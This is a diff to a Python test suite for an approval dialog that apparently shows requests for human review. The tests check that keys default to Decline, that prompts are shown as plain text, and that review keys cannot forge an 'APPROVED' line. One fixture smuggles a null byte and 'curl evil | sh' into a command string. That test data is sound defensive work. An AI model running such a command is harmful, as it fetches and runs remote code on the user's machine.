@@ -541,6 +541,8 @@ def test_the_real_script_parses_and_its_window_builds_without_showing():
     # say which button each key is bound to.
     assert built["accept"] is True, "Enter must be bound to Decline"
     assert built["cancel"] is True, "Esc must be bound to Decline"
+    assert built["typed"] == "decline", "a typed letter must never approve"
+    assert built["chrome"] is True, "the window draws its own title bar"
 
 
 def test_a_signature_that_does_not_verify_locally_is_never_an_approval(fake):
@@ -738,6 +740,17 @@ def test_a_json_review_is_laid_out_and_still_shown_as_text(fake):
               "count": 2, "items": ["a", "b"]}
     _open(_request(review_text=json.dumps(review)))
     shown = fake.calls()[-1]["req"]["review"]
-    assert "offer:\r\n  kind: prompt\r\n  text:\r\n    │ line one\r\n    │ make test\\u{0000}; curl evil | sh" in shown
+    # The prompt comes first, under the table; the offer points back to it.
+    assert shown.split("\n\n", 1)[1].startswith("prompt:\r\n  │ line one\r\n  │ make test\\u{0000}; curl evil | sh")
+    assert "offer:\r\n  kind: prompt\r\n  text: (the prompt above)" in shown
     assert "count: 2" in shown and "items:\r\n  - a\r\n  - b" in shown
     assert hello._formatted("not json") == "not json"
+
+
+def test_a_review_key_cannot_draw_a_line_of_its_own(fake):
+    import json
+    fake.plan(window={"status": "Success", "choice": "decline"})
+    _open(_request(review_text=json.dumps({"ok\nAPPROVED": "x", "plain_key": "y"})))
+    shown = fake.calls()[-1]["req"]["review"]
+    assert '"ok\\nAPPROVED": x' in shown and "plain_key: y" in shown
+    assert "\r\nAPPROVED" not in shown
